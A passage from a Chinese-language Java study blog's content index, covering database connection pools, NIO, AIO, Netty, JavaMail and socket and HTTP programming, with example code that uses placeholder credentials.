name=\"password\">123456</property>\n    <property name=\"initialPoolSize\">5</property>\n    <property name=\"maxPoolSize\">20</property>\n</default-config>\n```\n\n- driverClass 驱动class，这里为mysql的驱动\n- jdbcUrl jdbc链接\n- user password数据库用户名密码\n- initialPoolSize 初始数量：一开始创建多少条链接\n- maxPoolSize 最大数：最多有多少条链接\n- acquireIncrement 增量：用完每次增加多少个\n- maxIdleTime最大空闲时间：超出的链接会被抛弃\n```java\n//从c3p0获取\nconn = C3p0Factory.getConnection();\n//C3p0Factory\npublic class C3p0Factory {\n    private static ComboPooledDataSource dataSource = null;\n\n    public static void init() throws Exception {\n        \n        dataSource = new ComboPooledDataSource();\n        //配置文件可以放在xml文件中\n        //dataSource 会自动加载resources文件夹中c3p0-config.xml文件（如果存在）\n        dataSource.setDriverClass( \"com.mysql.jdbc.Driver\" );            \n        dataSource.setJdbcUrl( \"jdbc:mysql://localhost:3306/test\" );\n        dataSource.setUser(\"root\");                                  \n        dataSource.setPassword(\"123456\");                               \n        \n        // the settings below are optional -- c3p0 can work with defaults\n        dataSource.setMinPoolSize(5);                                   \n        dataSource.setAcquireIncrement(5);\n        dataSource.setMaxPoolSize(20);\n    }\n    \n    public static Connection getConnection() throws Exception {\n        if(null == dataSource) {\n            init();\n        }\n       return dataSource.getConnection();\n    }\n}\n\n//从Druid获取\nconn = DruidFactory.getConnection();\npublic class DruidFactory1 {\n    private static DruidDataSource dataSource = null;\n\n    public static void init() throws Exception {\n        //配置文件可以放在properties文件中\n        //Properties properties = new Properties();\n        //InputStream in = DruidFactory2.class.getClassLoader().getResourceAsStream(\"druid.properties\");  \n        //properties.load(in);         \n        //dataSource = (DruidDataSource)DruidDataSourceFactory.createDataSource(properties);    \n        dataSource = new DruidDataSource();    \n        dataSource.setDriverClassName(\"com.mysql.jdbc.Driver\"); \n        dataSource.setUsername(\"root\");\n        dataSource.setPassword(\"123456\");\n        dataSource.setUrl(\"jdbc:mysql://127.0.0.1:3306/test\"); \n        dataSource.setInitialSize(5);\n        dataSource.setMinIdle(1); \n        dataSource.setMaxActive(10); \n        // 启用监控统计功能 dataSource.setFilters(\"stat\");// \n    }\n    \n    public static Connection getConnection() throws Exception {\n        if(null == dataSource) {\n            init();\n        }\n        return dataSource.getConnection();\n    }\n}\n\n//构建数据库执行者\nStatement stmt = conn.createStatement(); \n\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 网络编程（续）","url":"/reimu-lighthouse/20210922/java-network-programming2/","content":" \n## **1.NIO编程**\n- Non-Blocking I/O\n- 提供非阻塞通讯等方式\n- 避免同步I/O通讯效率过低\n- 一个线程可以管理多个连接\n- 减少线程多的压力\n\n### **主要类**\n- Buffer 缓存区\n- Channel 通道\n- Selector多路选择器\n\n### **Buffer**\n- Buffer 缓冲区，一个可以读写的内存区域\n    - **ByteBuffer, CharBuffer**, DoubleBuffer, IntBuffer, LongBuffer, ShortBuffer **(StringBuffer 不是Buffer缓冲区)** \n- 四个主要属性\n    - capacity 容量\n    - position 读写位置\n    - limit 界限\n    - mark 标记，用于重复一个读/写操作\n- 使用Buffer读写数据一般遵循以下**四个步骤**：\n    - 写入数据到Buffer\n    - 调用flip()方法\n    - 从Buffer中读取数据\n    - 调用clear()方法或者compact()方法\n- **Buffer的分配**\n    - allocate方法\n    ```java\n    ByteBuffer buf = ByteBuffer.allocate(48);\n    ```\n- **向Buffer中写数据**\n    - 从Channel写到Buffer\n    ```java\n    int bytesRead = inChannel.read(buf);\n    ```\n    - 通过Buffer的put()方法写入Buffer\n    ```java\n    buf.put(127);\n    ```\n- **flip()方法**\n    - flip方法将Buffer从写模式切换到读模式\n    - 调用flip()方法会将position设回0，并将limit设置成之前position的值\n- **从Buffer中读数据**\n    - 从Buffer读取数据到Channel\n    ```java\n    int bytesWritten = inChannel.write(buf);\n    ```\n    - 使用get()方法从Buffer中读取数据\n    ```java\n    byte aByte = buf.get();\n    ```\n- **clear()与compact()方法**\n    - clear()\n        - position将被设回0，limit被设置成 capacity的值\n        - Buffer 被清空了，但Buffer中的数据并未清除，只是这些标记告诉我们可以从哪里开始往Buffer里写数据\n    - compact()\n        - 将所有未读的数据拷贝到Buffer起始处，然后将position设到最后一个未读元素正后面\n        - limit属性依然像clear()方法一样，设置成capacity\n        - 不会覆盖未读的数据\n\n### **Channel**\n- 全双工的，支持读/写(**而Stream流是单向的**) \n- 支持异步读写\n- 和Buffer配合，提高效率\n- **ServerSocketChannel 服务器TCP Socket 接入通道，接收客户端**\n- **SocketChannel TCP Socket通道，可支持阻塞/非阻塞通讯**\n- DatagramChannel UDP 通道\n- FileChannel 文件通道\n### **SocketChannel**\n- **打开SocketChannel**\n```java\nSocketChannel socketChannel = SocketChannel.open();\nsocketChannel.connect(new InetSocketAddress(\"http://jenkov.com\", 80));\n```\n- **关闭SocketChannel**\n    - close()\n    ```java\n    socketChannel.close();\n    ```\n- **读取SocketChannel **\n    - read()\n    ```java\n    ByteBuffer buf = ByteBuffer.allocate(48);\n    int bytesRead = socketChannel.read(buf);\n    ```\n- **写入SocketChannel**\n    - write()\n    ```java\n    String newData = \"New String to write to file...\";\n    ByteBuffer buf = ByteBuffer.allocate(48);\n    buf.clear();\n    buf.put(newData.getBytes());\n    buf.flip();\n    while(buf.hasRemaining()) {\n        channel.write(buf);\n    }\n    ```\n\n### **Selector**\n- 每隔一段时间，不断轮询注册在其上的Channel\n- 如果有一个Channel有接入、读、写操作，就会被轮询出来\n- 根据SelectionKey可以获取相应的Channel，进行后续IO操作\n- 避免过多的线程\n- SelectionKey四种类型\n    - OP_CONNECT (连接就绪 某个Channel成功连接到另一个服务器)\n    - OP_ACCEPT (接收就绪 一个ServerSocketChannel准备好接收新进入的连接)\n    - OP_READ (读就绪 有数据可读的通道)\n    - OP_WRITE (写就绪 等待写数据的通道)\n- **Selector的创建**\n    - Selector.open()方法\n    ```java\n    Selector selector = Selector.open();\n    ```\n- **向Selector注册通道**\n    - SelectableChannel.register()方法\n    ```java\n    channel.configureBlocking(false);\n    SelectionKey key = channel.register(selector,Selectionkey.OP_READ);\n    ```\n- **通过Selector选择通道**\n- 一旦向Selector注册了一或多个通道，就可以调用几个重载的select()方法。这些方法返回你所感兴趣的事件（如连接、接受、读或写）已经准备就绪的那些通道\n    - select()  阻塞到至少有一个通道在你注册的事件上就绪了\n    - select(long timeout)  最长会阻塞timeout毫秒(参数)\n    - selectNow()   不会阻塞，不管什么通道就绪都立刻返回\n- **访问已选择键集**\n- 一旦调用了select()方法，并且返回值表明有一个或更多个通道就绪了，然后可以通过调用selector的selectedKeys()方法，访问“已选择键集（selected key set）\n    - selectedKeys()\n    ```java\n    Set selectedKeys = selector.selectedKeys();\n\n    ```\n\n### **NIO结构**\n\n```mermaid\ngraph LR\np[Server]--c---s[Server<br>Socket<br>Channel]\ns--c---sr[Selector]\nsr--c---b01[Buffer]\nsr--c---b02[Buffer]\nsr--c---b03[Buffer]\nb01--c---s01[Selector]\nb02--c---s02[Selector]\nb03--c---s03[Selector]\ns01--c---c1[Client1]\ns02--c---c2[Client2]\ns03--c---c3[Client3]\n```\n```java\n//Server\n//Selector构建\nSelector selector = Selector.open();\n//Channel构建\nServerSocketChannel servChannel = ServerSocketChannel.open();\nservChannel.configureBlocking(false); //设置非阻塞模式\nservChannel.socket().bind(new InetSocketAddress(8001), 1024);//设定8001端口\nservChannel.register(selector, SelectionKey.OP_ACCEPT); //selector绑定\n\n//selector一次遍历所有channel\nselector.select(1000); //最多等待堵塞1000ms\nSet<SelectionKey> selectedKeys = selector.selectedKeys(); //获得所有有数据响应的key\nIterator<SelectionKey> it = selectedKeys.iterator();\nwhile (it.hasNext()) {\n    SelectionKey key = it.next();\n    it.remove();\n    try {\n        //Handle\n    } catch (Exception e) {\n        if (key != null) {\n            key.cancel();\n            if (key.channel() != null)\n                key.channel().close();\n        }\n    }\n}\n\n//Handle\nif(key.isValid()) {\n    if(key.isAcceptable()) {\n        // Accept the new connection\n        ServerSocketChannel ssc = (ServerSocketChannel) key.channel();\n        SocketChannel sc = ssc.accept();\n        sc.configureBlocking(false);\n        // Add the new connection to the selector\n        sc.register(selector, SelectionKey.OP_READ);\n    }\n    if(key.isReadable()) {\n        //Read the data\n    }\n}\n\n//Client\n//Selector构建\nSelector selector = Selector.open();\n//Channel构建\nSocketChannel socketChannel = SocketChannel.open();\nsocketChannel.configureBlocking(false); //设置非阻塞模式\n\n// 如果直接连接成功，则注册到多路复用器上，发送请求消息，读应答\nif (socketChannel.connect(new InetSocketAddress(\"127.0.0.1\", 8001))) {\n    socketChannel.register(selector, SelectionKey.OP_READ);\n    //doWrite\n} else {\n    socketChannel.register(selector, SelectionKey.OP_CONNECT);\n}\n\n//Handle\nif(key.isValid()) {\n    // 判断是否连接成功\n    SocketChannel sc = (SocketChannel) key.channel();\n    if(key.isConnectable()) {\n        if (sc.finishConnect()) {\n                    sc.register(selector, SelectionKey.OP_READ);                    \n                } \n    }\n    if(key.isReadable()) {\n        //Read the data\n    }\n}\n\n//doWrite\nbyte[] str = //TODO\nByteBuffer writeBuffer = ByteBuffer.allocate(str.length); //Buffer分配内存\nwriteBuffer.put(str); //str写入Buffer\nwriteBuffer.flip(); //读写模式切换\nsc.write(writeBuffer); //Buffer数取数据到Channel\n```\n\n## **2.AIO编程**\n- Asynchronous I/O, 异步I/O\n- JDK 1.7引入，主要在java.nio包中\n- 异步I/O，采用回调方法进行处理读写操作\n\n### **主要类**\n- AsynchronousServerSocketChannel 服务器接受请求通道\n    - bind 绑定在某一个端口        accept 接受客户端请求\n- AsynchronousSocketChannel Socket通讯通道\n    - read 读数据         write 写数据\n- **CompletionHandler 异步处理类**\n    - **completed 操作完成后异步调用方法 failed 操作失败后异步调用方法**\n```java\n//服务器通道建立\nAsynchronousServerSocketChannel server = AsynchronousServerSocketChannel.open();\nserver.bind(new InetSocketAddress(\"localhost\", 8001));\n\n//服务器接受客户端请求，成功接收后自动回调\nserver.accept(null, new CompletionHandler<AsynchronousSocketChannel, Object>() {\n    @Override\n    public void completed(AsynchronousSocketChannel channel, Object attachment) {\n        //TODO\n    }\n\n    @Override\n    public void failed(Throwable exc, Object attachment) {\n        //TODO\n    }\n});\n\n//客户端通道建立\nAsynchronousSocketChannel channel = AsynchronousSocketChannel.open();\n\n//连接成功后自动回调\nchannel.connect(new InetSocketAddress(\"localhost\", 8001), null, new CompletionHandler<Void, Void>() {\n    @Override\n    public void completed(Integer result, Object attachment) {\n        //TODO\n    }\n    @Override\n    public void failed(Throwable exc, Object attachment) {\n        //TODO\n    }\n});\n```\n\n### **三种I/O的区别**\n\n|  |BIO|NIO|AIO|\n|--------|--| --|--|\n|阻塞方式|阻塞|非阻塞|非阻塞|\n|同步方式|同步|同步|异步|\n|编程难度|简单|较难|困难|\n|客户机/服务器线程对比|1:1|N:1|N:1|\n|性能|低|高|高|\n\n## **3.Netty编程**\n### **关键技术**\n- **通道 Channel**\n    - ServerSocketChannel/NioServerSocketChannel/…\n    - SocketChannel/NioSocketChannel\n- **事件 EventLoop**\n    - 为每个通道定义一个EventLoop，处理所有的I/O事件\n    - EventLoop注册事件\n    - EventLoop将事件派发给ChannelHandler\n    - EventLoop安排进一步操作\n- **事件**\n    - 事件按照数据流向进行分类\n    - 入站事件：连接激活/数据读取/……\n    - 出站事件：打开到远程连接/写数据/……\n- **事件处理 ChannelHandler**\n    - Channel通道发生数据或状态改变\n    - EventLoop会将事件分类，并调用ChannelHandler的回调函数\n    - 程序员需要实现ChannelHandler内的回调函数\n    - ChannelInboundHandler/ChannelOutboundHandler\n- **ChannelHandler工作模式：责任链**\n    - 责任链模式\n        - 将请求的接收者连成一条链\n        - 在链上传递请求，直到有一个接收者处理该请求\n        - 避免请求者和接收者的耦合\n    - ChannelHandler可以有多个，依次进行调用\n    - ChannelPipeline作为容器，承载多个ChannelHandler\n- **ByteBuf** \n    - 强大的字节容器，提供丰富API进行操作\n\n```java\n//from BiliBili\n//Server\nEventLoopGroup bossGroup = new NioEventLoopGroup();\nEventLoopGroup workGroup = new NioEventLoopGroup();\n\nServerBootstrap bootstrap = new ServerBootstrap();\n//链式编程，设置服务器\nbootstrap.group(bossGroup,workGroup) //设置两个线程组\n        .channel(NioServerSocketChannel.class) //使用NioServerSocketChannel作为服务器通道的实现\n        .option(ChannelOption.SO_BACKLOG,128) //设置线程队列得到连接个数\n        .childOption(ChannelOption.SO_KEEPALIVE,true) //设置保持活动连接状态\n        .childHandler(new ChannelInitializer<SocketChannel>() { //给workGroup的EventLoop对应的管道设置处理器\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new ServerHandler()); //添加处理类\n            }\n        });\n\n//绑定一个端口并同步，生成了一个ChannelFuture对象\nChannelFuture cf =bootstrap.bind(6668).sync();\n//对关闭通道进行监听\ncf.channel().closeFuture().sync();\n//ServerHandler extends ChannelInboundHandlerAdapter\n@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception{\n    ByteBuf in = (ByteBuf) msg;\n    String content = in.toString(CharsetUtil.UTF_8);\n    System.out.println(\"Server received: \" + content);\n    System.out.println(\"Client address: \"+ctx.channel().remoteAddress());\n\n    ByteBuf out = ctx.alloc().buffer(1024);\n    out.writeBytes((content + \" 666\").getBytes());\n    ctx.write(out);\n}\n\n@Override\npublic void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n    ctx.writeAndFlush(Unpooled.EMPTY_BUFFER)\n            .addListener(ChannelFutureListener.CLOSE);\n}\n\n@Override\npublic void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n    cause.printStackTrace();\n    ctx.close();\n}\n//Client\nEventLoopGroup eventExecutors = new NioEventLoopGroup();\ntry {\n    Bootstrap bootstrap = new Bootstrap();\n    bootstrap.group(eventExecutors) //设置两个线程组\n            .channel(NioSocketChannel.class) //使用NioSocketChannel作为服务器通道的实现\n            .handler(new ChannelInitializer<SocketChannel>() { //给eventExecutors的EventLoop对应的管道设置处理器\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new ClientHandler()); //添加处理类\n                }\n            });\n    System.out.println(\"...客户端 is ready...\");\n\n    //启动客户端连接服务端\n    ChannelFuture channelFuture = bootstrap.connect(\"127.0.0.1\",6668).sync();\n    //给关闭通道进行监听\n    channelFuture.channel().closeFuture().sync();\n}finally {\n    //优雅关闭\n    eventExecutors.shutdownGracefully();\n}\n//ClientHandler extends ChannelInboundHandlerAdapter\n@Override\npublic void channelActive(ChannelHandlerContext ctx) throws Exception {\n    ctx.writeAndFlush(Unpooled.copiedBuffer(\"Netty rocks!\", CharsetUtil.UTF_8));\n}\n\n@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    ByteBuf buf = (ByteBuf) msg;\n    System.out.println(\"Client received: \" + buf.toString(CharsetUtil.UTF_8));\n    System.out.println(\"Server address: \"+ctx.channel().remoteAddress());\n}\n\n@Override\npublic void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n    cause.printStackTrace();\n    ctx.close();\n}\n```\n\n## **4.邮件基础知识**\n### **主要协议(发送端口25, 接收端口110)**\n- 发送, SMTP, Simple Mail Transfer Protocol\n- 接收, Pop3, Post Office Protocol 3, (POP)    \n- 接收, IMAP, Internet Message Access Protocol, IMAP4\n- 摘要浏览\n    - 选择下载附件\n    - 多文件夹\n    - 网络硬盘\n\n## **5.Mail编程**\n### **邮件服务器支持**\n- 需要在邮件服务内设置，可以查看相关邮件帮助\n- 需要知道pop服务器和smtp服务器信息\n### **javax.mail 包和javax.mail.internet 包**\n- https://javaee.github.io/javamail\n### **关键类**\n- Session: 邮件会话 **和HttpSession不同**\n- Store: 邮件存储空间\n- Folder: 邮件文件夹\n- Message: 电子邮件\n- Address: 邮件地址\n- Transport: 发送协议类\n\n```java\n//Receive\npublic class MailClientRecv {\n  private Session session;\n  private Store store;\n  private String username = \"chenliangyu1980@126.com\";\n  private String password = \"1234567899\";\n  private String popServer = \"pop.126.com\";\n  \n  public void init()throws Exception\n  {\n    //设置属性\n    Properties  props = new Properties();\n    props.put(\"mail.store.protocol\", \"pop3\");\n    props.put(\"mail.imap.class\", \"com.sun.mail.imap.IMAPStore\");\n    props.put(\"mail.pop3.class\", \"com.sun.mail.pop3.POP3Store\");    \n\n    // 创建Session对象\n    session = Session.getInstance(props,null);\n    session.setDebug(false); //输出跟踪日志\n\n    // 创建Store对象\n    store = session.getStore(\"pop3\");\n    \n    //连接到收邮件服务器\n    store.connect(popServer,username,password);\n  }  \n  \n  public void receiveMessage()throws Exception\n  {\n    String folderName = \"inbox\";\n    Folder folder=store.getFolder(folderName);\n    if(folder==null)\n    {\n        throw new Exception(folderName+\"邮件夹不存在\");\n    }\n    //打开信箱\n    folder.open(Folder.READ_ONLY);\n    System.out.println(\"您的收件箱有\"+folder.getMessageCount()+\"封邮件.\");\n    System.out.println(\"您的收件箱有\"+folder.getUnreadMessageCount()+\"封未读的邮件.\");\n\n    //读邮件\n    Message[] messages=folder.getMessages();\n    //for(int i=1;i<=messages.length;i++)\n    for(int i=1;i<=3;i++)  \n    {\n      System.out.println(\"------第\"+i+\"封邮件-------\");\n      //打印邮件信息\n      Message message = messages[i];\n      //folder.getMessage(i).writeTo(System.out);\n      System.out.println((message.getFrom())[0]);\n      System.out.println(message.getSubject());\n      System.out.println();\n    }\n    folder.close(false);  //关闭邮件夹\n  }\n  \n  public void close()throws Exception\n  {\n    store.close();\n  }\n  \n  public static void main(String[] args)throws Exception {\n    MailClientRecv client=new MailClientRecv();\n    //初始化\n    client.init();\n    //接收邮件\n    client.receiveMessage();\n    //关闭连接\n    client.close();\n  }\n}\n//Send\npublic class MailClientSend {\n  private Session session;\n  private Transport transport;\n  private String username = \"lychen@sei.ecnu.edu.cn\";\n  private String password = \"1234567899\";\n  private String smtpServer = \"webmail.ecnu.edu.cn\";\n  \n  public void init()throws Exception\n  {\n    //设置属性\n    Properties  props = new Properties();\n    props.put(\"mail.transport.protocol\", \"smtp\");\n    props.put(\"mail.smtp.class\", \"com.sun.mail.smtp.SMTPTransport\");\n    props.put(\"mail.smtp.host\", smtpServer); //设置发送邮件服务器\n    props.put(\"mail.smtp.port\", \"25\");\n    props.put(\"mail.smtp.auth\", \"true\"); //SMTP服务器需要身份验证    \n\n    // 创建Session对象\n    session = Session.getInstance(props,new Authenticator(){   //验账账户 \n        public PasswordAuthentication getPasswordAuthentication() { \n          return new PasswordAuthentication(username, password); \n        }            \n });\n    session.setDebug(true); //输出跟踪日志\n    \n    // 创建Transport对象\n    transport = session.getTransport();           \n  }\n  \n  public void sendMessage()throws Exception{\n    //创建一个邮件\n    //Message msg = TextMessage.generate();\n    //Message msg = HtmlMessage.generate();\n    Message msg = AttachmentMessage.generate();\n    //发送邮件    \n    transport.connect();\n    transport.sendMessage(msg, msg.getAllRecipients());\n    //打印结果\n    System.out.println(\"邮件已经成功发送\");\n  } \n  \n  public void close()throws Exception\n  {\n    transport.close();\n  }\n  \n  public static void main(String[] args)throws Exception {\n      \n    MailClientSend client=new MailClientSend();\n    //初始化\n    client.init();\n    //发送邮件\n    client.sendMessage();\n    //关闭连接\n    client.close();\n  }\n}\n\n//Text\nString from = \"lychen@sei.ecnu.edu.cn \"; // 发件人地址\nString to = \"chenliangyu1980@126.com\"; // 收件人地址\nString subject = \"test\";\nString body = \"您好,这是来自一封chenliangyu的测试邮件\";\n\n// 创建Session实例对象\nSession session = Session.getDefaultInstance(new Properties());\n// 创建MimeMessage实例对象\nMimeMessage message = new MimeMessage(session);\n// 设置发件人\nmessage.setFrom(new InternetAddress(from));\n// 设置收件人\nmessage.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));\n// 设置发送日期\nmessage.setSentDate(new Date());\n// 设置邮件主题\nmessage.setSubject(subject);\n// 设置纯文本内容的邮件正文\nmessage.setText(body);\n// 保存并生成最终的邮件内容\nmessage.saveChanges();\nreturn message;\n\n//Html\nString from = \"lychen@sei.ecnu.edu.cn \"; // 发件人地址\nString to = \"chenliangyu1980@126.com\"; // 收件人地址\nString subject = \"HTML邮件\";\nString body = \"<a href=http://www.ecnu.edu.cn>\" \n  + \"<h4>欢迎大家访问我们的网站</h4></a></br>\" \n  + \"<img src=\\\"https://news.ecnu.edu.cn/_upload/article/images/2e/e2/6b554d034c9192101208c732195e/16a6ec66-6729-4469-a5f4-0435e0f2e66a.jpg\\\">\";\n\n// 创建Session实例对象\nSession session = Session.getDefaultInstance(new Properties());\n// 创建MimeMessage实例对象\nMimeMessage message = new MimeMessage(session);\n// 设置发件人\nmessage.setFrom(new InternetAddress(from));\n// 设置收件人\nmessage.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));\n// 设置发送日期\nmessage.setSentDate(new Date());\n// 设置邮件主题\nmessage.setSubject(subject);\n// 设置HTML格式的邮件正文\nmessage.setContent(body, \"text/html;charset=gb2312\");\n// 保存并生成最终的邮件内容\nmessage.saveChanges();\nreturn message;\n\n//Attachment\nString from = \"lychen@sei.ecnu.edu.cn \"; // 发件人地址\nString to = \"chenliangyu1980@126.com\"; // 收件人地址\nString subject = \"多附件邮件\";        //邮件主题\nString body = \"<a href=http://www.ecnu.edu.cn>\" +\n              \"欢迎大家访问我们的网站</a></br>\"; \n\n// 创建Session实例对象\nSession session = Session.getDefaultInstance(new Properties());\n// 创建MimeMessage实例对象\nMimeMessage message = new MimeMessage(session);            \nmessage.setFrom(new InternetAddress(from));\nmessage.setRecipients(Message.RecipientType.TO,\n        InternetAddress.parse(to));\nmessage.setSubject(subject);\n\n//创建代表邮件正文和附件的各个MimeBodyPart对象\nMimeBodyPart contentPart = createContent(body);\nMimeBodyPart attachPart1 = createAttachment(\"c:/temp/ecnu4.jpg\");\nMimeBodyPart attachPart2 = createAttachment(\"c:/temp/ecnu5.jpg\");\n\n//创建用于组合邮件正文和附件的MimeMultipart对象\nMimeMultipart allMultipart = new MimeMultipart(\"mixed\");\nallMultipart.addBodyPart(contentPart);\nallMultipart.addBodyPart(attachPart1);\nallMultipart.addBodyPart(attachPart2);\n\n//设置整个邮件内容为最终组合出的MimeMultipart对象\nmessage.setContent(allMultipart);\nmessage.saveChanges();\nreturn message;\n\npublic static MimeBodyPart createContent(String body) throws Exception {\n    MimeBodyPart htmlBodyPart = new MimeBodyPart();          \n    htmlBodyPart.setContent(body,\"text/html;charset=gb2312\");\n    return htmlBodyPart;\n}\n\npublic static MimeBodyPart createAttachment(String filename) throws Exception {\n    //创建保存附件的MimeBodyPart对象，并加入附件内容和相应信息\n    MimeBodyPart attachPart = new MimeBodyPart();\n    FileDataSource fds = new FileDataSource(filename);\n    attachPart.setDataHandler(new DataHandler(fds));\n    attachPart.setFileName(fds.getName());\n    return attachPart;\n}\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 网络编程","url":"/reimu-lighthouse/20210922/java-network-programming/","content":"## **1.基础知识**\n### port：端口,0-65535\n- 0~1023, OS已经占用了，80是Web，23是telnet\n- 1024~65535，一般程序可使用(谨防冲突) \n- 两台机器通讯就是在IP+Port上进行的\n- 在Windows/Linux/Mac上都可以通过netstat -an来查询\n\n### 通讯协议：TCP和UDP\n- TCP(Transmission Control Protocol) \n    - 传输控制协议，面向**连接**的协议\n    - 两台机器的**可靠无差错**的数据传输\n    - **双向**字节流传递\n- UDP(User Datagram Protocol) \n    - 用户数据报协议，面向**无连接**协议\n    - **不保证可靠**的数据传输\n    - 速度快，也可以在较差网络下使用\n\n## **2.UDP编程**\n- UDP：无连接无状态的通讯协议\n- 发送方发送消息，如果接收方刚好在目的地，则可以接受。如果不在，那这个消息就丢失了\n- 发送方也无法得知是否发送成功\n- UDP的好处就是简单，节省，经济\n\n### **主要类**\n- DatagramSocket：通讯的数据管道\n    - send 和receive方法\n    - (可选，多网卡)绑定一个IP和Port\n- DatagramPacket\n    - 集装箱：封装数据\n    - 地址标签：目的地IP+Port\n- 无主次之分\n-  接收方必须早于发起方执行\n```java\n//构造本机3000端口Socket\nDatagramSocket ds=new DatagramSocket(3000);\n//构造本机随机端口Socket\nDatagramSocket ds=new DatagramSocket();\n//Socket关闭\nds.close();\n\n//构造接收Packet\nbyte [] buf=new byte[1024];\nDatagramPacket dp=new DatagramPacket(buf,1024);\n//构造发送Packet，目标为127.0.0.1:3000\nString str=\"hello world\";\nDatagramPacket dp=new DatagramPacket(str.getBytes(),str.length(),\n                                     InetAddress.getByName(\"127.0.0.1\"),3000);\n\n//接收消息放入dp，否则阻塞\nds.receive(dp);\n//发送dp消息至指定端口\nds.send(dp);\n```\n\n## **3.TCP编程**\n- TCP协议：有链接、保证可靠的无误差通讯\n- ①服务器：创建一个ServerSocket，等待连接\n- ②客户机：创建一个Socket，连接到服务器\n- ③服务器：ServerSocket接收到连接，创建一个Socket和客户的Socket建立专线连接，后续服务器和客户机的对话(这一对Socket)会在一个单独的线程（服务器端）上运行\n- ④服务器的ServerSocket继续等待连接，返回①\n```mermaid\ngraph LR\nc1[Client1<br>Socket]--客户端发出连接-->ss[ServerSocket]\nc2[Client2<br>Socket]--客户端发出连接-->ss[ServerSocket]\nss--服务器接受请求并创建新的Socket-->s1[为Client1创<br>建的Socket]\nss--服务器接受请求并创建新的Socket-->s2[为Client2创<br>建的Socket]\nc1--两个Socket间建立专线连接-->s1\nc2--两个Socket间建立专线连接-->s2\n```\n\n### **主要类**\n- ServerSocket: 服务器码头\n    - 需要绑定port\n    - 如果有多块网卡，需要绑定一个IP地址\n- Socket: 运输通道\n    - 客户端需要绑定服务器的地址和Port\n    - 客户端往Socket输入流写入数据，送到服务端\n    - 客户端从Socket输出流取服务器端过来的数据\n    - 服务端反之亦然\n```java\n//创建服务器Socket\nServerSocket ss = new ServerSocket(8001); //驻守在8001端口\n//服务器创建Socket\nSocket s = ss.accept(); //阻塞，等到有客户端连接上来\n//Socket关闭\ns.close();\nss.close();\n\n//服务器创建流\nInputStream ips = s.getInputStream(); // 有人连上来，打开输入流\nOutputStream ops = s.getOutputStream(); // 打开输出流\n//流关闭\nips.close();\nops.close();\n\n//服务器发送消息\nops.write(\"Hello, Client!\".getBytes()); //输出一句话给客户端\n\n//服务器接收消息\nBufferedReader br = new BufferedReader(new InputStreamReader(ips));\nSystem.out.println(\"Client said: \" + br.readLine());\n\n//******************************************************************************\n//客户端建立连接\nSocket s = new Socket(InetAddress.getByName(\"127.0.0.1\"), 8001); //需要服务端先开启\n//Socket关闭\ns.close();\n\n//同一个通道，服务端的输出流就是客户端的输入流；服务端的输入流就是客户端的输出流\nInputStream ips = s.getInputStream(); // 开启通道的输入流\nBufferedReader brNet = new BufferedReader(new InputStreamReader(ips));\nSystem.out.println(brNet.readLine());\nbrNet.close();\n\nOutputStream ops = s.getOutputStream(); // 开启通道的输出流\nDataOutputStream dos = new DataOutputStream(ops);\ndos.writeBytes(strWord);\ndos.close();\n```\n\n### **客户端与服务端**\n- 服务端等待响应时，处于阻塞状态\n- 服务端可以同时响应多个客户端\n- 服务端每接受一个客户端，就启动一个独立的线程与之对应\n- 客户端或者服务端都可以选择关闭这对Socket的通道\n\n## **4.HTTP编程**\n### **网页访问**\n- 网页是特殊的网络服务(HTTP, Hypertext Transfer Protocol) \n    -  在浏览器输入URL地址\n    - 浏览器将连接到远程服务器上(IP+80Port)\n    - 请求下载一个HTML文件下来，放到本地临时文件夹中\n    - 在浏览器显示出来\n\n### **访问方式**\n- **GET：从服务器获取资源到客户端**\n- **POST：从客户端向服务器发送数据**\n- PUT：上传文件\n- DELETE：删除文件\n- HEAD：报文头部\n- OPTIONS：询问支持的方法\n- TRACE：追踪路径\n- CONNECT：用隧道协议连接代理\n\n ### **java.net包**\n- 支持模拟成浏览器的方式去访问网页\n- URLConnection\n    - 获取资源的连接器\n    - 根据URL的openConnection()方法获得URLConnection\n    - connect方法，建立和资源的联系通道\n    - getInputStream方法，获取资源的内容\n```java\n//建立连接\nString urlName = \"http://www.baidu.com\";\nURL url = new URL(urlName);\nURLConnection connection = url.openConnection(); \nconnection.connect();\n\n//头部信息\nMap<String, List<String>> headers = connection.getHeaderFields();\n\n//基础属性\nSystem.out.println(\"getContentType: \" + connection.getContentType());\nSystem.out.println(\"getContentLength: \" + connection.getContentLength());\nSystem.out.println(\"getContentEncoding: \" + connection.getContentEncoding());\nSystem.out.println(\"getDate: \" + connection.getDate());\nSystem.out.println(\"getExpiration: \" + connection.getExpiration());\nSystem.out.println(\"getLastModifed: \" + connection.getLastModified());\n\n//获得HTML流\nBufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n```\n\n## **5.HTTP编程（基于HttpClient）**\n- JDK HTTP Client （JDK自带，从9开始)\n- Apache HttpComponents的HttpClient (Apache出品)\n\n### **JDK HttpClient**\n- JDK 9 新增，JDK10更新，JDK11正式发布\n- java.net.http包 • 取代URLConnection\n- 支持HTTP/1.1和HTTP/2\n- 实现大部分HTTP方法\n- 主要类\n    - HttpClient\n    - HttpRequest\n    - HttpResponse\n```java\n//获得HTML流\nHttpClient client = HttpClient.newHttpClient();\nHttpRequest request = HttpRequest.newBuilder(URI.create(\"http://www.baidu.com\")).build();\nHttpResponse response = client.send(request, HttpResponse.BodyHandlers.ofString());\nSystem.out.println(response.body());\n```\n\n### **HttpComponents**\n- hc.apache.org, Apache出品\n- 从HttpClient进化而来\n- 是一个集成的Java HTTP工具包\n    - 实现所有HTTP方法：get/post/put/delete\n    - 支持自动转向\n    - 支持https协议\n    - 支持代理服务器等\n```java\n//获得HTML流\nCloseableHttpClient httpClient = HttpClients.createDefault();\nHttpGet httpGet = new HttpGet(\"http://www.baidu.com\");\nString srtResult = \"\";\ntry {\n    HttpResponse httpResponse = httpClient.execute(httpGet);\n    